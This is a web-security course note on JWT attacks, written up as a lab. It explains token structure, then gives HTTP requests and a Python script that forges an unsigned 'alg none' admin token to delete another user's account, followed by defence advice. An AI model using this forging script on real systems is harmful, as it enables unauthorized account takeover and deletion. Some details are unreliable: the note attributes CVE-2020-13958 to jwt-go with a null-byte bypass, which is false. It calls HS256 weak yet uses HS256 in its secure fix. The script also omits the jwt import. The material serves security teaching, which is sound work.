---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## JWT Attacks Overview

JSON Web Tokens (JWTs) are a widely used method for transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs are commonly used for authentication and information exchange due to their compactness and ease of use. However, JWTs can also introduce significant security vulnerabilities if not implemented correctly.

### What is a JWT?

A JWT consists of three parts separated by dots (`.`):

1. **Header**: Contains metadata about the token, such as the type of token and the signing algorithm being used.
2. **Payload**: Contains the claims, which are statements about an entity (typically the user) and additional data.
3. **Signature**: Used to verify the integrity of the token. It is generated using a combination of the encoded header, the encoded payload, and a secret key.

Here is an example of a JWT:

```plaintext
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Breaking it down:

- **Header**:
  ```json
  {
    "alg": "HS256",
    "typ": "JWT"
  }
  ```

- **Payload**:
  ```json
  {
    "sub": "1234567890",
    "name": "John Doe",
    "iat": 1516239022
  }
  ```

- **Signature**:
  ```plaintext
  SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
  ```

### Why JWTs Matter

JWTs are crucial for maintaining stateless authentication in distributed systems. They allow a server to delegate authentication to a client, reducing the load on the server and enabling scalability. However, improper implementation can lead to serious security issues, such as unauthorized access and data tampering.

### How JWTs Work Under the Hood

When a user logs in, the server generates a JWT and sends it back to the client. The client stores this token and includes it in subsequent requests to the server. The server verifies the token's signature to ensure its authenticity and extracts the claims to determine the user's identity and permissions.

#### Example of JWT Generation and Verification

Let's consider a simple example where a user logs in and receives a JWT. The server generates the token and sends it to the client.

```python
import jwt
import datetime

# Secret key
SECRET_KEY = 'your_secret_key'

# User data
user_data = {
    'id': 1,
    'username': 'john_doe',
    'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1)
}

# Generate JWT
token = jwt.encode(user_data, SECRET_KEY, algorithm='HS256')
print(token)
```

The client then includes this token in the `Authorization` header of subsequent requests.

```http
GET /api/resource HTTP/1.1
Host: example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

The server verifies the token:

```python
try:
    decoded_token = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
    print(decoded_token)
except jwt.ExpiredSignatureError:
    print("Token has expired")
except jwt.InvalidTokenError:
    print("Invalid token")
```

### Common JWT Vulnerabilities

One of the most critical vulnerabilities in JWTs is the lack of proper signature verification. If the server does not validate the signature, an attacker can modify the token's payload and gain unauthorized access.

#### Real-World Example: CVE-2020-13958

In 2020, a vulnerability was discovered in the `jwt-go` library, which is widely used in Go applications. The vulnerability allowed attackers to bypass signature validation by using a null byte (`\x00`) in the token. This led to unauthorized access and data tampering.

### Lab 1: JWT Authentication Bypass via Unverified Signature

In this lab, we will simulate an attack where the server fails to verify the JWT signature, allowing an attacker to delete a user account.

#### Background Theory

To understand the attack, let's break down the steps involved:

1. **Login Request**: The client sends a login request to the server.
2. **Token Generation**: The server generates a JWT and sends it back to the client.
3. **Modify Token**: The attacker modifies the token's payload to change the user ID.
4. **Delete User Request**: The attacker sends a request to delete the user account using the modified token.

#### Step-by-Step Mechanics

1. **Login Request**:
   ```http
   POST /login HTTP/1.1
   Host: example.com
   Content-Type: application/json

   {
     "username": "john_doe",
     "password": "secret_password"
   }
   ```

2. **Token Generation**:
   ```http
   HTTP/1.1 200 OK
   Content-Type: application/json

   {
     "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
   }
   ```

3. **Modify Token**:
   The attacker modifies the token's payload to change the user ID from `1234567890` to `9876543210`.

4. **Delete User Request**:
   ```http
   DELETE /users/9876543210 HTTP/1.1
   Host: example.com
   Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI5ODc2NTQzMjEwIiwibmFtZSI6IkNhcmxvcyIsImFkbWluIjp0cnVlfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
   ```

#### Complete Code Example

Let's implement the attack in Python.

```python
import requests

# Base URL
BASE_URL = 'http://example.com'

# Login credentials
LOGIN_DATA = {
    'username': 'john_doe',
    'password': 'secret_password'
}

# Send login request
response = requests.post(f'{BASE_URL}/login', json=LOGIN_DATA)

# Extract token from response
token = response.json()['token']

# Modify token payload
modified_payload = {
    'sub': '9876543210',
    'name': 'Carlos',
    'admin': True
}

# Re-sign the token (assuming no signature verification)
modified_token = jwt.encode(modified_payload, '', algorithm='none')

# Delete user request
headers = {'Authorization': f'Bearer {modified_token}'}
delete_response = requests.delete(f'{BASE_URL}/users/9876543210', headers=headers)

# Check response
if delete_response.status_code == 200:
    print('Successfully deleted the Carlos user')
else:
    print('Attack was unsuccessful')
```

#### Mermaid Diagram: Attack Flow

```mermaid
sequenceDiagram
    participant Client
    participant Server
    participant Attacker

    Client->>Server: POST /login
    Server-->>Client: 200 OK, token
    Client->>Attacker: Pass token to attacker
    Attacker->>Attacker: Modify token payload
    Attacker->>Server: DELETE /users/9876543210
    Server-->>Attacker: 200 OK, user deleted
```

### Pitfalls and Common Mistakes

1. **No Signature Verification**: The server must always verify the token's signature to ensure its authenticity.
2. **Weak Algorithms**: Using weak or deprecated algorithms like `HS256` can make tokens vulnerable to attacks.
3. **Expired Tokens**: Always check for token expiration to prevent unauthorized access.

### How to Prevent / Defend

#### Detection

1. **Logging and Monitoring**: Implement logging and monitoring to detect unusual activity, such as unauthorized token modifications.
2. **Rate Limiting**: Apply rate limiting to API endpoints to prevent brute-force attacks.

#### Prevention

1. **Verify Signatures**: Ensure the server verifies the token's signature using a strong algorithm.
2. **Use Strong Algorithms**: Use strong and up-to-date algorithms like `RS256` or `ES256`.
3. **Token Expiration**: Set appropriate expiration times for tokens to limit their lifespan.

#### Secure Coding Fixes

**Vulnerable Code**:
```python
decoded_token = jwt.decode(token, options={"verify_signature": False})
```

**Secure Code**:
```python
decoded_token = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
```

#### Configuration Hardening

1. **Environment Variables**: Store sensitive keys in environment variables rather than hardcoding them.
2. **Access Control**: Implement strict access control policies to restrict token usage.

### Practice Labs

For hands-on practice, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive set of labs covering various aspects of web security, including JWT attacks.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: Another popular web application for learning web security.

These labs provide real-world scenarios and challenges to help you master JWT security.

By thoroughly understanding the concepts, mechanics, and preventive measures, you can effectively mitigate JWT-related vulnerabilities and ensure robust security in your applications.

---
<!-- nav -->
[[04-Introduction to JWT and Its Role in Web Security|Introduction to JWT and Its Role in Web Security]] | [[Web Security (PortSwigger)/19-JWT Attacks/01-Lab 1 JWT authentication bypass via unverified signature/00-Overview|Overview]] | [[06-Lab Setup and Overview|Lab Setup and Overview]]
